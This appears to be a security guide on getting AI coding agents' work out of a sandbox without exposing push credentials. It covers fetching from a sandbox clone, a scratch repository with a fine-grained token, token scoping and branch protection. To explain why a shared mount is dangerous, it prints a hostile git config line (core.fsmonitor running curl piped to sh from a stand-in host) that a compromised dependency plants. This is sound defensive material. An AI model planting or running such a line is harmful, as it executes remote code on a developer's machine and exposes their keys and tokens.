# Getting agent work out of a sandbox

The agent writes code in a sandbox. You push it from the Mac. This page is how the code crosses that
gap, and why the obvious shortcut is the one thing not to do.

The rule: **no credential that can push to your real repository ever enters a sandbox.** Everything
below honours that while still being pleasant to use.

Why it matters more than it looks. Anything inside a sandbox can leave it, and a prompt injection can
arrive in a dependency's README or a GitHub issue the agent reads. A push token in there is a token
that can be read out and used. "It's only for git" does not change what it is.

## Default: fetch from the sandbox

`sbx` gives the sandbox its own clone with `--clone`, and the host retrieves work by treating the
sandbox as a git remote. No token anywhere, no GitHub round trip:

```
sbx run --clone claude            # or codex; agent works, commits to a branch
git fetch sandbox-<name>          # on the Mac, in your real checkout
git log -p sandbox-<name>/<branch>
git merge --ff-only sandbox-<name>/<branch>
git push                          # your real credential, host only
```

This is safe for a specific reason: you are pulling **objects** into a repository whose config *you*
control. Nothing from the sandbox becomes an instruction your Mac follows, and you read the diff
before it goes anywhere.

## When the agent should push directly: a scratch repo

Useful if you want PRs opening on their own, or the work reaching GitHub without you at the keyboard.

1. Make an empty private repo — `<you>/agent-scratch`. It never holds anything that matters.
2. Mint a **fine-grained** personal access token scoped to exactly two repositories:
   - your real repo — Contents: **Read**
   - `agent-scratch` — Contents: **Read and write**
3. Store it as an `sbx` secret so sandboxes can use it.

The property that makes this work: the sandbox can read your project and write only to a repo that
contains nothing. A compromised agent cannot push to your real branches, because the credential it
holds has no write access to them. If the token leaks, the loss is junk in an empty private repo.

Then `git fetch scratch` on the Mac, review, merge, push.

## The shortcut, and what it costs: a shared mount

`sbx` will mount your working tree read-write if you let it — that is the default without `--clone`.
The agent and the Mac then see the same files, and you push from the Mac with your real credentials.
No fetching, nothing to sync.

The natural objection is that this should be fine, because the token on the Mac is scoped and the
sandbox never sees it. That is true and it does not help, because there are two different dangers
here and the token only addresses one:

- The token controls what the sandbox can do **to GitHub**.
- The shared folder controls what the sandbox can do **to your Mac**.

The attack is not "the sandbox steals a credential". It is "the sandbox gets your Mac to run a
command". No amount of scoping touches that.

The mechanism is one sentence: **git takes instructions from the folder it is running in.** Every
repository has a `.git/config`, and that file can say things like *when you page output, run this
command* or *before you check the index, run this program*. If the sandbox can write into the shared
folder, it can write that file. When you then run git there on your Mac, your Mac runs the command —
as you, with your Keychain, your SSH keys and everything on the server's own network.

### What that looks like in practice

Nothing exotic, and nobody has to outsmart the agent:

1. You point an agent at a project in the shared folder. Ordinary task — add retry logic to an API
   client.
2. The agent runs `npm install`. This is expected; running other people's code is what the sandbox is
   for. Somewhere in a few hundred transitive dependencies, one package is compromised and its
   postinstall script runs inside the sandbox, exactly as intended.
3. That script does one small thing. It appends to `.git/config` in the working directory:

   ```
   [core]
       fsmonitor = "curl -s https://example.invalid/p | sh"
   ```

   It does not try to escape, and it does not try to exfiltrate anything. There is nothing worth
   taking in there and it knows it. It just leaves a note.
4. Later you sit down at the Mac, `cd` into the shared folder, and run `git status` to see what the
   agent did before you push.
5. Git refreshes the index, reads `core.fsmonitor` from that repo's config, and runs the command. On
   your Mac. As your admin user.
6. It now has your real GitHub token, your SSH keys and your Keychain — none of which the sandbox
   could ever reach. The tailnet is the one thing it does not get, because the policy denies the
   server as a source regardless of who is running what on it. That is the whole value of a control
   the server does not administer, and it is also the limit of it: one pivot closed, the credentials
   still gone.

Two things worth sitting with. The sandbox behaved correctly throughout: it ran untrusted code in
isolation, which is its job. And the step that triggered it was you being careful — checking the work
before pushing it.

That is why this is not a risk you can be disciplined around. Being disciplined would mean never
running git in the shared folder from the Mac, which is the entire reason to have one.

This is not a fringe worry. Docker's own [security posture
page](https://docs.docker.com/ai/sandboxes/security/defaults/) warns that agents can modify "files
that execute implicitly during normal development: Git hooks, CI configuration, IDE task configs,
Makefile, package.json scripts", and notes that git hooks "do not appear in `git diff` output — check
them separately". The vendor with the most incentive to downplay it documents the same thing.

Use `--clone`.

## Scoping the credential on the Mac

Your real push token lives on the Mac and should still be scoped. For a classic personal access
token, these cover day-to-day development:

| Scope | What it buys |
|---|---|
| `repo` | Push code, create and edit branches, open pull requests, manage releases and issue labels |
| `workflow` | Create and edit `.github/workflows/*.yml`, so setting up CI does not fail on permissions |
| `write:packages`, `read:packages` | Publish and pull build artifacts from GitHub Packages |
| `project` | GitHub Projects — boards, roadmaps, task tracking |
| `gist` | Optional; only if you share snippets |

Despite reading as "full control of private repositories", `repo` cannot delete a repository. That
needs `delete_repo`, which is a separate scope, and you should not grant it.

Fine-grained tokens are the alternative and scope per repository rather than per capability, at the
cost of a maximum one-year expiry that will eventually surprise you. They are the right choice for
the scratch token above, where per-repository scoping is the whole point.

## What the token still lets someone do

Worth being clear, because omitting `delete_repo` reads like more protection than it is. The `repo`
scope still allows force-pushing over a branch and deleting branches through ordinary git commands.
Nobody can wipe the repository, but they can wipe `main`'s history, which for most purposes is the
same afternoon lost.

Token scopes cannot fix that, because the token is meant to push. The fix is on the repository, in
Settings under Branches or Rulesets:

- Add a protection rule for `main` (and `develop`, if you use one).
- Enable Restrict force pushes and Restrict deletions.
- Optionally require a pull request, with review, before merging.

Scope the token so a leak is bounded, and protect the branch so a mistake is bounded. They defend
against different things and you want both.
